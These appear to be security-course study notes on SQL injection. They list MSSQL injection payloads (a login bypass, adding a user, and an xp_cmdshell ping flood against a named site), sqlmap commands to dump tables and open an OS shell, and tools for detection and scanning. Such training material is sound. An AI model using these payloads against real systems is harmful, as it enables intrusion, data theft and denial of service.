# Module 15 - SQL Injection #

## SQL Injection on an MSSQL Database ##

``` blah' or 1=1 -- - ```

``` blah'; insert into login values('john','apple123'); -- - ``` - Inserting a new user into the table 'login'

``` blah'; create database mydatabase; -- - ``` - Creating a new database

``` blah'; exec master..xp_cmdshell 'ping www.moviescope.com -l 65000 -t'; -- - ``` - To perform a DoS to a site

### SQLMap ###
``` sqlmap -u <URL with Parameters - Ex. /?id=1> --cookie=<document.cookie> --dbs ``` - It tampers with the parameters in the URL to attempt to extract database information

``` sqlmap -u <URL with Parameters - Ex. /?id=1> --cookie=<document.cookie> -D <Database Name> ``` - It displays info about the specific database

``` sqlmap -u <URL with Parameters - Ex. /?id=1> --cookie=<document.cookie> -D <Database Name> --tables ``` - It displays the tables of the specified database

``` sqlmap -u <URL with Parameters - Ex. /?id=1> --cookie=<document.cookie> -D <Database Name> -T <Table> --columns ``` - It displays the columns of the specified table

``` sqlmap -u <URL with Parameters - Ex. /?id=1> --cookie=<document.cookie> -D <Database Name> -T <Table> --dump ``` - It dumps all the info about the specified table

``` sqlmap -u <URL with Parameters - Ex. /?id=1> --cookie=<document.cookie> --os-shell ``` - To execute an os shell

### Other SQL Injection Tools ###
* Mole (https://sourceforge.net)
* Blisqy (GitHub)
* blind-sql-bitshifting (GitHub)
* bsql (GitHub)
* NoSQLMap (GitHub)


- - - -

## Detecting SQL Injection Vulnerabilities ##
### DSSS ###
It can be downloaded: `git clone https://github.com/stamparm/DSSS`. Or in Windows at: `Module 15 SQL Injection\GitHub Tools`.

`python3 dsss.py -u <URL with Parameters - Ex. /?id=1> --cookie="<document.cookie>"` - It will provide you with a link with SQLi results

### OWASP ZAP ###
It can be found at: `Module 11 Session Hijacking\OWASP ZAP\`.

'Quick Start' tab > 'Automated Scan' > Select the URL > 'Attack'. In the 'Alerts' tab the found vulns will appear.

### Other SQL Injection Detection Tools ###
* Acunetix Web Vulnerability Scanner (https://www.acunetix.com)
* Snort (https://snort.org)
* Burp Suite (https://www.portswigger.net)
* w3af (http://w3af.org)
* Netsparker Web Application Security Scanner (https://www.netsparker.com)


- - - -

## Scanning Web Applications ##
### N-Stalker ###
1. Enter the URL and the 'OWASP Policy' Scan Policy. Leave everything else to default.
2. 'Start Scan'

It shows the website tree, the vulnerabilities found, objects, stats...
